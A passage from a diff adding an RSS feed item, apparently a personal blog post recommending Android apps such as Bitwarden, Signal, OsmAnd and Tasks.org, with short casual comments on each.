+    &lt;strong&gt;
+     App store
+    &lt;/strong&gt;
+    :
+    &lt;a href="https://gitlab.com/AuroraOSS/auroradroid"&gt;
+     aurora f-droid
+    &lt;/a&gt;
+   &lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+   &lt;p&gt;
+    &lt;strong&gt;
+     Password manager
+    &lt;/strong&gt;
+    :
+    &lt;a href="https://github.com/bitwarden/mobile"&gt;
+     bitwarden
+    &lt;/a&gt;
+   &lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+   &lt;p&gt;
+    &lt;strong&gt;
+     Browser
+    &lt;/strong&gt;
+    :
+    &lt;a href="https://www.bromite.org/"&gt;
+     bromite
+    &lt;/a&gt;
+    . This is basically ungoogled
+chromium but for mobile.
+   &lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+   &lt;p&gt;
+    &lt;strong&gt;
+     Calendar
+    &lt;/strong&gt;
+    :
+    &lt;a href="https://github.com/Etar-Group/Etar-Calendar"&gt;
+     etar
+    &lt;/a&gt;
+   &lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+   &lt;p&gt;
+    &lt;a href="https://github.com/etesync/android"&gt;
+     etesync
+    &lt;/a&gt;
+   &lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+   &lt;p&gt;
+    &lt;strong&gt;
+     File browser
+    &lt;/strong&gt;
+    :
+    &lt;a href="https://github.com/zhanghai/MaterialFiles"&gt;
+     material
+files
+    &lt;/a&gt;
+    . It looks sexy, it's free,
+it's awesome.
+   &lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+   &lt;p&gt;
+    &lt;strong&gt;
+     Email client
+    &lt;/strong&gt;
+    :
+    &lt;a href="https://email.faircode.eu/"&gt;
+     fairemail
+    &lt;/a&gt;
+    . STOP CRYING.
+   &lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+   &lt;p&gt;
+    &lt;strong&gt;
+     Maps
+    &lt;/strong&gt;
+    :
+    &lt;a href="https://osmand.net/"&gt;
+     osmand
+    &lt;/a&gt;
+   &lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+   &lt;p&gt;
+    &lt;strong&gt;
+     Music player
+    &lt;/strong&gt;
+    :
+    &lt;a href="https://www.shuttlemusicplayer.com/"&gt;
+     shuttle
+    &lt;/a&gt;
+    . It looks
+sexy, it's free, it's awesome.
+   &lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+   &lt;p&gt;
+    &lt;strong&gt;
+     Instant messenger
+    &lt;/strong&gt;
+    :
+    &lt;a href="https://signal.org/"&gt;
+     signal
+    &lt;/a&gt;
+    .
+    &lt;a href="https://twitter.com/elonmusk/status/1347165127036977153"&gt;
+     papa musk said
+it
+    &lt;/a&gt;
+    .
+   &lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+   &lt;p&gt;
+    &lt;strong&gt;
+     Manga reader
+    &lt;/strong&gt;
+    :
+    &lt;a href="https://tachiyomi.org/"&gt;
+     tachiyomi
+    &lt;/a&gt;
+   &lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+   &lt;p&gt;
+    &lt;strong&gt;
+     To-do lists
+    &lt;/strong&gt;
+    :
+    &lt;a href="https://tasks.org/"&gt;
+     tasks.org
+    &lt;/a&gt;
+    . This is easily the best
+to-do app I've ever used, and it integrated very well with etesync.
+   &lt;/p&gt;
+  &lt;/li&gt;
+ &lt;/ul&gt;
+ &lt;h3 id="closed-source"&gt;
+  Closed source
+ &lt;/h3&gt;
+ &lt;ul&gt;
+  &lt;li&gt;
+   &lt;strong&gt;
+    Reddit client
+   &lt;/strong&gt;
+   :
+   &lt;a href="https://play.google.com/store/apps/details?id=com.laurencedawson.reddit_sync"&gt;
+    sync
+   &lt;/a&gt;
+  &lt;/li&gt;
+ &lt;/ul&gt;
+&lt;/div&gt;</description>
+    </item>
+  </channel>
+</rss>
